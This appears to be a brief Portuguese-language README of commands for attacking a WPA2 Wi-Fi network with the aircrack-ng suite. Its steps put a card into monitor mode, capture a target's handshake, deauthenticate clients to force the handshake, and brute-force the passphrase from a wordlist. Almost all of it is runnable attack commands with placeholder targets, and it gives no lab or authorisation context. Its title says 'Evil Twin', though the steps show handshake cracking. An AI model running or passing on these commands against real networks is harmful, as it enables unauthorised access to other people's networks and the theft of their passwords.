# Wifi-WPA2-Evil-Twin-Attack--aircrack-ng

1-Capturar o handshake

ifconfig wlan0 down
airmon-ng check kill
airmon-ng start wlan0
airodump-ng --essid-regex "Red*" -a wlanmon0
airodump-ng wlan0mon
mkdir wpa
cd wpa
airodump-ng --bssid BSSIDTARGET -c 11 -w cvr wlan0mon 

2-Desautenticar para forçar o handshake

aireplay-ng -0 1 -a TARGETBSSID wlan0mon        (-0 = tipo do ataque(deauth) 1 = 1 pacote de desautenticação) (-a 00:17:9A:35:53:22 = acess point + bssid)

3-Brute force

aircrack-ng -b TARGETBSSID -w /usr/share/wordlists/dirb/big.txt cvr-01.cap
